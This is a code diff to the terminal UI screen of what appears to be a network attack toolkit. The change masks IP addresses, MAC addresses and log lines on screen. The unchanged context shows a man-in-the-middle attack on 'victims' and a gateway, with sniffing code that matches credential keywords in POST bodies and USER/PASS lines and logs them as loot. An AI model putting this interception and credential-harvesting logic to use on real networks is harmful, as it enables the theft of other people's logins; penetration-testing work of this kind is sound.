@@ -18,7 +18,7 @@ import urwid
 
 from ...app_state import AppState
 from ...loot_manager import LootManager
-from ...privacy import mask_line
+from ...privacy import mask_line, mask_ip, mask_mac
 from ..widgets.log_viewer import LogViewer
 from ..widgets.confirm_dialog import ConfirmDialog
 from ..widgets.info_dialog import InfoDialog
@@ -83,10 +83,10 @@ class MITMScreen(urwid.WidgetWrap):
     def refresh(self) -> None:
         if self.state.mitm_running:
             pkts = self.state.mitm_packets
-            victims = ", ".join(ip for ip, _ in self._victims)
+            victims = ", ".join(mask_ip(ip) for ip, _ in self._victims)
             self._info.set_text(
                 ("attack_active",
-                 f"  MITM RUNNING | {victims} ↔ {self._gateway_ip} | "
+                 f"  MITM RUNNING | {victims} ↔ {mask_ip(self._gateway_ip)} | "
                  f"Packets: {pkts}")
             )
             self._status.set_text(("dim", "  [x]Stop"))
@@ -320,7 +320,8 @@ class MITMScreen(urwid.WidgetWrap):
                 if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
                     qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
                     src = pkt[IP].src if pkt.haslayer(IP) else "?"
-                    self._log.append(f"  DNS: {src} → {qname}", "dim")
+                    self._log.append(
+                        mask_line(f"  DNS: {src} → {qname}"), "dim")
                     return
 
                 if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
@@ -342,7 +343,8 @@ class MITMScreen(urwid.WidgetWrap):
                                     host = hdr.split(":", 1)[1].strip()
                                     break
                             url = f"{host}{method_path.split(' ', 1)[1]}" if host else method_path
-                            self._log.append(f"  HTTP: {method_path.split()[0]} {url}", "default")
+                            self._log.append(
+                                mask_line(f"  HTTP: {method_path.split()[0]} {url}"), "default")
 
                             # Check for credentials in POST body
                             if method_path.startswith("POST"):
@@ -353,7 +355,8 @@ class MITMScreen(urwid.WidgetWrap):
                                                "pwd", "auth", "token", "secret")
                                     if any(k in body.lower() for k in cred_kw):
                                         self._log.append(
-                                            f"  CREDS: {body[:200]}", "attack_active"
+                                            mask_line(f"  CREDS: {body[:200]}"),
+                                            "attack_active",
                                         )
                                         if self._loot:
                                             self._loot.log_attack_event(
@@ -373,7 +376,8 @@ class MITMScreen(urwid.WidgetWrap):
                         auth_kw = ("USER", "PASS", "LOGIN", "AUTH")
                         if any(text.upper().startswith(k) for k in auth_kw):
                             self._log.append(
-                                f"  AUTH [{proto}]: {text[:150]}", "warning"
+                                mask_line(f"  AUTH [{proto}]: {text[:150]}"),
+                                "warning",
                             )
                             if self._loot:
                                 self._loot.log_attack_event(
@@ -574,7 +578,7 @@ class MITMScreen(urwid.WidgetWrap):
 
             # Show found hosts in log
             for ip, mac in filtered:
-                self._log.append(f"  {ip}  ({mac})", "default")
+                self._log.append(f"  {mask_ip(ip)}  ({mask_mac(mac)})", "default")
             self._log.append(
                 f"\n  Found {len(filtered)} hosts. Enter target IP:", "success"
             )
@@ -623,7 +627,7 @@ class MITMScreen(urwid.WidgetWrap):
                 return
 
             for ip, mac in filtered:
-                self._log.append(f"  {ip}  ({mac})", "default")
+                self._log.append(f"  {mask_ip(ip)}  ({mask_mac(mac)})", "default")
 
             self._victims = filtered
             self._log.append(
@@ -643,12 +647,12 @@ class MITMScreen(urwid.WidgetWrap):
         self._gateway_mac = self._get_mac(self._gateway_ip, self._iface)
         if not self._gateway_mac:
             self._log.append(
-                f"  ERROR: Could not resolve gateway MAC ({self._gateway_ip})",
+                f"  ERROR: Could not resolve gateway MAC ({mask_ip(self._gateway_ip)})",
                 "error",
             )
             return
 
-        victims_str = ", ".join(ip for ip, _ in self._victims)
+        victims_str = ", ".join(mask_ip(ip) for ip, _ in self._victims)
         if len(self._victims) > 3:
             victims_str = f"{len(self._victims)} hosts"
 
@@ -661,7 +665,7 @@ class MITMScreen(urwid.WidgetWrap):
         dialog = ConfirmDialog(
             f"Start MITM attack?\n"
             f"Victims: {victims_str}\n"
-            f"Gateway: {self._gateway_ip}\n"
+            f"Gateway: {mask_ip(self._gateway_ip)}\n"
             f"Interface: {self._iface}",
             on_confirm,
         )
@@ -678,9 +682,9 @@ class MITMScreen(urwid.WidgetWrap):
         self._log.clear()
         self._body.original_widget = self._log
 
-        victims_str = ", ".join(ip for ip, _ in self._victims)
+        victims_str = ", ".join(mask_ip(ip) for ip, _ in self._victims)
         self._log.append(
-            f">>> MITM: {victims_str} ↔ {self._gateway_ip} via {self._iface}",
+            f">>> MITM: {victims_str} ↔ {mask_ip(self._gateway_ip)} via {self._iface}",
             "attack_active",
         )
 
